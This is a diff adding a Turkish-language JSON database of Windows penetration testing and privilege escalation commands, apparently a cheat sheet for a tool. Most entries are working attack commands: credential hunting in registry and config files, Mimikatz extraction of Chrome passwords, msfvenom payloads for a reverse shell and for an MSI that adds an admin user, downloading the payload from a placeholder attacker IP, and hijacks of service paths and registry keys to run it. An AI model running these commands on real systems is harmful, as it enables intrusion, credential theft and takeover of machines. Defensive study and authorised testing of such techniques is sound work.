@@ -1,0 +1,498 @@
+{
+  "cyn0_security_database": {
+    "version": "1.0",
+    "description": "Windows Privilege Escalation ve Penetration Testing Komutları",
+    "last_updated": "2025-06-03",
+    "categories": {
+      "system_reconnaissance": {
+        "name": "Sistem Keşif",
+        "description": "Hedef sistem hakkında bilgi toplama komutları",
+        "commands": [
+          {
+            "id": "sys_recon_001",
+            "name": "Sistem Bilgisi",
+            "command": "Get-ComputerInfo",
+            "description": "Bilgisayar hakkında detaylı sistem bilgilerini alır",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "düşük",
+            "category": "bilgi_toplama"
+          },
+          {
+            "id": "sys_recon_002",
+            "name": "Ağ IP Adresleri",
+            "command": "Get-NetIpAddress",
+            "description": "Sistem üzerindeki tüm IP adreslerini listeler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "düşük",
+            "category": "bilgi_toplama"
+          },
+          {
+            "id": "sys_recon_003",
+            "name": "ARP Tablosu",
+            "command": "arp -a",
+            "description": "ARP tablosunu görüntüleyerek ağ üzerindeki cihazları listeler",
+            "platform": "windows",
+            "type": "cmd",
+            "risk_level": "düşük",
+            "category": "bilgi_toplama"
+          },
+          {
+            "id": "sys_recon_004",
+            "name": "Yerel Kullanıcılar",
+            "command": "Get-LocalUser",
+            "description": "Sistem üzerindeki tüm kullanıcı hesaplarını listeler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "düşük",
+            "category": "bilgi_toplama"
+          },
+          {
+            "id": "sys_recon_005",
+            "name": "Yerel Gruplar",
+            "command": "Get-LocalGroup",
+            "description": "Sistem üzerindeki tüm kullanıcı gruplarını listeler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "düşük",
+            "category": "bilgi_toplama"
+          },
+          {
+            "id": "sys_recon_006",
+            "name": "PowerShell Geçmişi",
+            "command": "cat (Get-PSReadlineOption).HistorySavePath",
+            "description": "PowerShell komut geçmişini görüntüler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "orta",
+            "category": "bilgi_toplama"
+          },
+          {
+            "id": "sys_recon_007",
+            "name": "Windows PowerShell Logları",
+            "command": "Get-WinEvent -LogName \"windows Powershell\"",
+            "description": "Windows PowerShell olay günlüklerini görüntüler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "orta",
+            "category": "bilgi_toplama"
+          },
+          {
+            "id": "sys_recon_008",
+            "name": "Pano İçeriği",
+            "command": "Get-Clipboard",
+            "description": "Sistem panosundaki içeriği görüntüler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "orta",
+            "category": "bilgi_toplama"
+          }
+        ]
+      },
+      "credential_hunting": {
+        "name": "Kimlik Bilgisi Avcılığı",
+        "description": "Sistemde saklanan parolalar ve kimlik bilgilerini bulma",
+        "commands": [
+          {
+            "id": "cred_hunt_001",
+            "name": "Dosyalarda Parola Arama",
+            "command": "cd \"C:\\Program Files\"\nGet-ChildItem -Recurse -ErrorAction SilentlyContinue | Select-String \"password\" -List | select path | where path -like \"*.conf\"",
+            "description": "Program Files dizininde .conf uzantılı dosyalarda 'password' kelimesini arar",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "yüksek",
+            "category": "parola_avcılığı",
+            "notes": "Konfigürasyon dosyalarında saklanan düz metin parolaları bulur"
+          },
+          {
+            "id": "cred_hunt_002",
+            "name": "AutoLogon Kullanıcı Adı",
+            "command": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" DefaultUserName",
+            "description": "Otomatik giriş için kayıtlı kullanıcı adını alır",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "yüksek",
+            "category": "parola_avcılığı"
+          },
+          {
+            "id": "cred_hunt_003",
+            "name": "AutoLogon Parolası",
+            "command": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" DefaultPassword",
+            "description": "Otomatik giriş için kayıtlı parolayı alır",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "kritik",
+            "category": "parola_avcılığı",
+            "notes": "AutoLogon etkinse parola düz metin olarak saklanır"
+          },
+          {
+            "id": "cred_hunt_004",
+            "name": "VNC Parolaları",
+            "command": "Get-ItemProperty \"HKCU:\\Software\\ORL\\WinVNC3\\Password\"\nGet-ItemProperty \"HKCU:\\Software\\TightVNC\\Server\" Password\nGet-ItemProperty \"HKLM:\\Software\\TightVNC\\Server\" Password",
+            "description": "VNC ve TightVNC servislerinin kayıtlı parolalarını alır",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "yüksek",
+            "category": "parola_avcılığı"
+          },
+          {
+            "id": "cred_hunt_005",
+            "name": "OpenSSH Anahtarları",
+            "command": "Get-ItemProperty \"HKCU:\\Software\\OpenSSH\\Agent\\Keys\"\nGet-ItemProperty \"HKLM:\\Software\\OpenSSH\\Agent\\Keys\"",
+            "description": "OpenSSH servisinin kayıtlı anahtarlarını alır",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "yüksek",
+            "category": "parola_avcılığı"
+          },
+          {
+            "id": "cred_hunt_006",
+            "name": "PuTTY Oturumları",
+            "command": "Get-ItemProperty \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"",
+            "description": "PuTTY SSH istemcisinin kayıtlı oturumlarını alır",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "orta",
+            "category": "parola_avcılığı"
+          }
+        ]
+      },
+      "advanced_credential_extraction": {
+        "name": "Gelişmiş Kimlik Bilgisi Çıkarma",
+        "description": "Mimikatz ve diğer gelişmiş araçlarla kimlik bilgisi çıkarma",
+        "commands": [
+          {
+            "id": "adv_cred_001",
+            "name": "Chrome Parola Çıkarma",
+            "command": "dpapi::chrome /in:\"C:\\Users\\<USER>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /masterkey:<MASTERKEY>",
+            "description": "Mimikatz kullanarak Chrome tarayıcısından kayıtlı parolaları çıkarır",
+            "platform": "windows",
+            "type": "mimikatz",
+            "risk_level": "kritik",
+            "category": "parola_çıkarma",
+            "notes": "Kullanıcı adı ve master key parametreleri gereklidir"
+          },
+          {
+            "id": "adv_cred_002",
+            "name": "SAM Dosya Konumları",
+            "command": "# SAM dosyası konumları:\n# C:\\Windows\\repair\\SAM\n# C:\\Windows\\System32\\config\\RegBack\\SAM\n# C:\\Windows\\System32\\config\\SAM",
+            "description": "Windows SAM dosyasının bulunduğu konumlar",
+            "platform": "windows",
+            "type": "info",
+            "risk_level": "kritik",
+            "category": "hash_çıkarma",
+            "notes": "SAM dosyası sistem çalışırken kilitlidir ve kopyalanamaz"
+          },
+          {
+            "id": "adv_cred_003",
+            "name": "Creddump7 Kullanımı",
+            "command": "# Creddump7 ile hash çıkarma",
+            "description": "Windows sistemlerinde güvenlik bilgilerini ve hash'leri çıkarmak için kullanılan araç",
+            "platform": "windows",
+            "type": "tool",
+            "risk_level": "kritik",
+            "category": "hash_çıkarma",
+            "notes": "Parolaları ve hash'leri çalmak için kullanılabilir"
+          }
+        ]
+      },
+      "privilege_escalation": {
+        "name": "Yetki Yükseltme",
+        "description": "Sistem üzerinde yetki yükseltme teknikleri",
+        "commands": [
+          {
+            "id": "priv_esc_001",
+            "name": "Reverse Shell Oluşturma",
+            "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ADDRESI> LPORT=4343 -f exe -o reverse.exe",
+            "description": "Metasploit ile Windows reverse shell payload'u oluşturur",
+            "platform": "windows",
+            "type": "msfvenom",
+            "risk_level": "kritik",
+            "category": "payload_oluşturma",
+            "notes": "IP adresi ve port numarası belirtilmelidir"
+          },
+          {
+            "id": "priv_esc_002",
+            "name": "HTTP Server ve Dosya İndirme",
+            "command": "python -m http.server\nInvoke-WebRequest -Uri \"http://<IP_ADDRESI>:8000/reverse.exe\" -OutFile .\\Desktop\\reverse.exe",
+            "description": "Python HTTP sunucusu başlatır ve PowerShell ile dosya indirir",
+            "platform": "windows",
+            "type": "mixed",
+            "risk_level": "yüksek",
+            "category": "dosya_transfer"
+          },
+          {
+            "id": "priv_esc_003",
+            "name": "AccessChk Kullanıcı Yetkileri",
+            "command": ".\\accesschk64.exe -uwcqv <KULLANICI> * /accepteula",
+            "description": "Belirtilen kullanıcının hizmetler üzerindeki yetkilerini kontrol eder",
+            "platform": "windows",
+            "type": "accesschk",
+            "risk_level": "orta",
+            "category": "yetki_kontrolü"
+          },
+          {
+            "id": "priv_esc_004",
+            "name": "Servis Konfigürasyonu Değiştirme",
+            "command": "sc.exe config svcconfig binpath=\"C:\\Users\\user\\Desktop\\reverse.exe\"\nstart-service svcconfig",
+            "description": "Servis binary path'ini değiştirir ve servisi başlatır",
+            "platform": "windows",
+            "type": "cmd",
+            "risk_level": "kritik",
+            "category": "servis_manipulation",
+            "notes": "SERVICE_CHANGE_CONFIG yetkisi gereklidir"
+          }
+        ]
+      },
+      "service_exploitation": {
+        "name": "Servis Sömürüsü",
+        "description": "Windows servislerindeki güvenlik açıklarını sömürme",
+        "commands": [
+          {
+            "id": "svc_exp_001",
+            "name": "Unquoted Service Path",
+            "command": "Get-WmiObject win32_service | ?{$_.Name -like '*svcunquoted*'} | select Name, DisplayName, State, PathName",
+            "description": "Tırnak işareti olmayan servis yollarını bulur",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "yüksek",
+            "category": "servis_zafiyeti"
+          },
+          {
+            "id": "svc_exp_002",
+            "name": "Dizin Yazma İzni Kontrolü",
+            "command": "get-acl 'C:\\Program Files\\Unquoted Service' | ForEach-Object Access | where identityreference -eq 'BUILTIN\\Users'",
+            "description": "Belirtilen dizin için kullanıcı yazma izinlerini kontrol eder",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "orta",
+            "category": "izin_kontrolü"
+          },
+          {
+            "id": "svc_exp_003",
+            "name": "Unquoted Service Sömürüsü",
+            "command": "cp C:\\Users\\user\\Desktop\\reverse.exe 'C:\\Program Files\\Unquoted Service\\Required.exe'\nstart-service svcunquoted",
+            "description": "Unquoted service path zafiyetini sömürerek payload çalıştırır",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "kritik",
+            "category": "servis_sömürü"
+          },
+          {
+            "id": "svc_exp_004",
+            "name": "Registry İzin Kontrolü",
+            "command": ".\\accesschk64.exe -k \"HKLM\\System\\CurrentControlSet\\Services\\svcregistry\" -d",
+            "description": "Servis registry anahtarı üzerindeki izinleri kontrol eder",
+            "platform": "windows",
+            "type": "accesschk",
+            "risk_level": "orta",
+            "category": "registry_kontrolü"
+          },
+          {
+            "id": "svc_exp_005",
+            "name": "Registry Üzerinden Servis Değiştirme",
+            "command": "Set-ItemProperty HKLM:\\System\\CurrentControlSet\\Services\\svcregistry -name ImagePath -Value 'C:\\Users\\user\\Desktop\\reverse.exe'\nstart-service svcregistry",
+            "description": "Registry üzerinden servis binary path'ini değiştirir",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "kritik",
+            "category": "registry_sömürü"
+          },
+          {
+            "id": "svc_exp_006",
+            "name": "Dosya İzinleri Sömürüsü",
+            "command": "cp .\\reverse.exe 'C:\\Program Files\\FilePerms\\service.exe'\nstart-service svcfileperms",
+            "description": "Güvensiz dosya izinlerine sahip servis executable'ını değiştirir",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "kritik",
+            "category": "dosya_sömürü"
+          }
+        ]
+      },
+      "persistence": {
+        "name": "Kalıcılık",
+        "description": "Sistemde kalıcılık sağlama teknikleri",
+        "commands": [
+          {
+            "id": "persist_001",
+            "name": "Zamanlanmış Görevler",
+            "command": "Get-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | select *",
+            "description": "Microsoft dışındaki zamanlanmış görevleri listeler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "orta",
+            "category": "görev_analizi"
+          },
+          {
+            "id": "persist_002",
+            "name": "Görev Aksiyonları",
+            "command": "Get-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | foreach Actions",
+            "description": "Zamanlanmış görevlerin çalıştırdığı aksiyonları listeler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "orta",
+            "category": "görev_analizi"
+          },
+          {
+            "id": "persist_003",
+            "name": "Registry Startup - HKLM Run",
+            "command": "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "description": "Tüm kullanıcılar için başlangıçta çalışan programları listeler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "yüksek",
+            "category": "başlangıç_programları"
+          },
+          {
+            "id": "persist_004",
+            "name": "Registry Startup - HKLM RunOnce",
+            "command": "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+            "description": "Tüm kullanıcılar için bir kerelik başlangıç programlarını listeler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "yüksek",
+            "category": "başlangıç_programları"
+          },
+          {
+            "id": "persist_005",
+            "name": "Registry Startup - HKCU Run",
+            "command": "Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "description": "Mevcut kullanıcı için başlangıçta çalışan programları listeler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "yüksek",
+            "category": "başlangıç_programları"
+          },
+          {
+            "id": "persist_006",
+            "name": "Registry Startup - HKCU RunOnce",
+            "command": "Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+            "description": "Mevcut kullanıcı için bir kerelik başlangıç programlarını listeler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "yüksek",
+            "category": "başlangıç_programları"
+          }
+        ]
+      },
+      "always_install_elevated": {
+        "name": "AlwaysInstallElevated",
+        "description": "MSI dosyalarının yükseltilmiş izinlerle çalıştırılması zafiyeti",
+        "commands": [
+          {
+            "id": "aie_001",
+            "name": "AlwaysInstallElevated HKLM Kontrolü",
+            "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated",
+            "description": "Machine-level AlwaysInstallElevated ayarını kontrol eder",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "yüksek",
+            "category": "zafiye_kontrolü",
+            "notes": "1 değeri dönerse aktiftir"
+          },
+          {
+            "id": "aie_002",
+            "name": "AlwaysInstallElevated HKCU Kontrolü",
+            "command": "Get-ItemProperty HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated",
+            "description": "User-level AlwaysInstallElevated ayarını kontrol eder",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "yüksek",
+            "category": "zafiye_kontrolü",
+            "notes": "1 değeri dönerse aktiftir"
+          },
+          {
+            "id": "aie_003",
+            "name": "MSI Payload Oluşturma",
+            "command": "msfvenom -p windows/adduser USER=newadmin PASS='Password123!' -f msi -o newadmin.msi",
+            "description": "Yeni yönetici kullanıcı ekleyen MSI payload'u oluşturur",
+            "platform": "windows",
+            "type": "msfvenom",
+            "risk_level": "kritik",
+            "category": "payload_oluşturma"
+          },
+          {
+            "id": "aie_004",
+            "name": "MSI Dosya İndirme",
+            "command": "python -m http.server\nInvoke-WebRequest -Uri \"http://<IP>:8000/newadmin.msi\" -OutFile .\\Desktop\\newadmin.msi",
+            "description": "Oluşturulan MSI dosyasını hedef sisteme indirir",
+            "platform": "windows",
+            "type": "mixed",
+            "risk_level": "yüksek",
+            "category": "dosya_transfer"
+          }
+        ]
+      },
+      "service_analysis": {
+        "name": "Servis Analizi",
+        "description": "Windows servislerinin analizi ve bağımlılıkları",
+        "commands": [
+          {
+            "id": "svc_anal_001",
+            "name": "Bağımlı Servisler",
+            "command": "Get-Service -Name \"LanmanServer\" -DependentServices",
+            "description": "Belirtilen servise bağımlı olan servisleri listeler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "düşük",
+            "category": "servis_analizi"
+          },
+          {
+            "id": "svc_anal_002",
+            "name": "Gerekli Servisler",
+            "command": "Get-Service -Name \"Tcpip\" -RequiredServices",
+            "description": "Belirtilen servisin çalışması için gerekli olan servisleri listeler",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "düşük",
+            "category": "servis_analizi"
+          },
+          {
+            "id": "svc_anal_003",
+            "name": "Servis Tipi",
+            "command": "Get-Service -Name \"svcregistry\" | Select-Object -ExpandProperty ServiceType",
+            "description": "Belirtilen servisin tipini gösterir",
+            "platform": "windows",
+            "type": "powershell",
+            "risk_level": "düşük",
+            "category": "servis_analizi"
+          }
+        ]
+      }
+    },
+    "risk_levels": {
+      "düşük": {
+        "description": "Minimal risk, bilgi toplama",
+        "color": "#28a745"
+      },
+      "orta": {
+        "description": "Orta seviye risk, sistem analizi",
+        "color": "#ffc107"
+      },
+      "yüksek": {
+        "description": "Yüksek risk, güvenlik açığı tespiti",
+        "color": "#fd7e14"
+      },
+      "kritik": {
+        "description": "Kritik risk, sistem güvenliğini tehlikeye atar",
+        "color": "#dc3545"
+      }
+    },
+    "platforms": [
+      "windows",
+      "mixed"
+    ],
+    "command_types": [
+      "powershell",
+      "cmd",
+      "mimikatz",
+      "msfvenom",
+      "accesschk",
+      "tool",
+      "info",
+      "mixed"
+    ]
+  }
+}
